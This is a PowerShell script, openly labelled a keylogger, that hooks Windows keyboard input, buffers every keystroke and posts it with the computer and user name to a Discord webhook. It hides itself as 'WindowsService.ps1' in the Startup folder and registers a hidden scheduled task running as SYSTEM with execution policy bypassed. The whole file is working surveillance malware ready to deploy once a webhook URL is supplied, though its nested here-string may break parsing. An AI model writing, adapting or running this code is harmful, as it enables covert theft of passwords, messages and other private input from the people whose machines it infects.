param(
    [Parameter(Mandatory=$false)]
    [string]$WebhookUrl = "YOUR-WEBHOOK-URL-HERE"
)

function Start-Keylogger {
    param($webhook)
    
    try {
        # Add persistence
        $scriptContent = @'
$webhookUrl = "WEBHOOK-PLACEHOLDER"

# Discord message function
function Send-Discord {
    param($hook, $content)
    try {
        $payload = @{
            content = $content
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $hook -Method Post -Body $payload -ContentType "application/json"
    } catch {}
}

# Create buffer for keystrokes
$buffer = ""
$bufferSize = 100
$lastSend = Get-Date

# Create the keyboard hook
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool UnhookWindowsHookEx(IntPtr hhk);

[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

[DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[StructLayout(LayoutKind.Sequential)]
public struct KBDLLHOOKSTRUCT {
    public uint vkCode;
    public uint scanCode;
    public uint flags;
    public uint time;
    public IntPtr dwExtraInfo;
}

public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
'@

Add-Type -MemberDefinition $API -Name KB -Namespace Win32 -PassThru

# Key mapping
$keyMap = @{
    8  = "[BKSP]";    9  = "[TAB]";     13 = "[ENTER]"
    19 = "[PAUSE]";   20 = "[CAPS]";    27 = "[ESC]"
    32 = " ";         33 = "[PGUP]";    34 = "[PGDN]"
    35 = "[END]";     36 = "[HOME]";    37 = "[LEFT]"
    38 = "[UP]";      39 = "[RIGHT]";   40 = "[DOWN]"
    44 = "[PRTSC]";   45 = "[INS]";     46 = "[DEL]"
}

# Hook callback
$callback = {
    param(
        [int]$nCode,
        [IntPtr]$wParam,
        [IntPtr]$lParam
    )
    
    if ($nCode -ge 0) {
        $kbStruct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($lParam, [Type][Win32.KB+KBDLLHOOKSTRUCT])
        $vkCode = $kbStruct.vkCode
        
        if ($wParam -eq 0x0100) { # WM_KEYDOWN
            $key = if ($keyMap.ContainsKey($vkCode)) {
                $keyMap[$vkCode]
            } else {
                [System.Text.Encoding]::ASCII.GetString([BitConverter]::GetBytes([uint16]$vkCode)).Trim([char]0)
            }
            
            $script:buffer += $key
            
            # Send buffer if full or time elapsed
            if ($buffer.Length -ge $bufferSize -or ((Get-Date) - $script:lastSend).TotalMinutes -ge 5) {
                $computerInfo = "$env:COMPUTERNAME | $env:USERNAME | $(Get-Date)"
                $content = "```[$computerInfo]`n$buffer```"
                Send-Discord -hook $webhookUrl -content $content
                $script:buffer = ""
                $script:lastSend = Get-Date
            }
        }
    }
    
    return [Win32.KB]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
}

# Set the hook
$hookID = [Win32.KB]::SetWindowsHookEx(13, $callback, [IntPtr]::Zero, 0)

# Keep the script running
while ($true) { Start-Sleep -Seconds 1 }
'@

        # Create startup entry
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsService.ps1"
        $scriptContent = $scriptContent.Replace("WEBHOOK-PLACEHOLDER", $webhook)
        $scriptContent | Out-File -FilePath $startupPath -Force
        
        # Create scheduled task for immediate elevation
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$startupPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Hidden
        
        Unregister-ScheduledTask -TaskName "WindowsServiceTask" -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName "WindowsServiceTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
        
        # Start the keylogger immediately
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$startupPath`"" -WindowStyle Hidden
        
        Write-Output "Keylogger deployed successfully"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Check for admin rights
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Requires administrative privileges"
    exit 1
}

# Deploy the keylogger
Start-Keylogger -webhook $WebhookUrl
